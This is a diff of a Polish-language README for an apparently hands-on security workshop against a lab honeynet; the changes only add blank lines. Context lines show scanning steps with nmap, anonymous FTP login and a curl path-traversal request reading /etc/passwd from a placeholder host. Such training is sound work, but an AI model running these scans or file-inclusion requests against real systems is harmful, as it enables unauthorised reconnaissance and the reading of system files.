@@ -3,6 +3,7 @@
 Wszystko, czego możesz potrzebować podczas warsztatów, jest dostępne w tym repozytorium.
 
 ## Uzyskiwanie dostępu
+
 Na początek przejdź do naszego stanowiska testowego:
 
 1. **Poświadczenia do AdminVM** - możesz użyć dowolnej przeglądarki internetowej:
@@ -106,6 +107,7 @@ curl --insecure https://<Point IP>/\?filename\=../../../etc/passwd
 sudo nmap -sS -sC -p80,443 <Honeynet IP> -vvv
 ```
 2. Eksploruj znaleziony serwer WWW
+
 Wykonaj LFI
 ```
 curl --insecure https://<Point IP>/\?filename\=../../../etc/passwd 
@@ -144,6 +146,7 @@ ssh <user>@warrior.labyrinth.tech
 sudo nmap -sS -sC -p21 -T4 <Honeynet subnet> -vvv 
 ```
 2. Połącz się z serwerem FTP
+
 Spróbuj połączyć się anonimowo:
 ```
 ftp <FTP IP address>
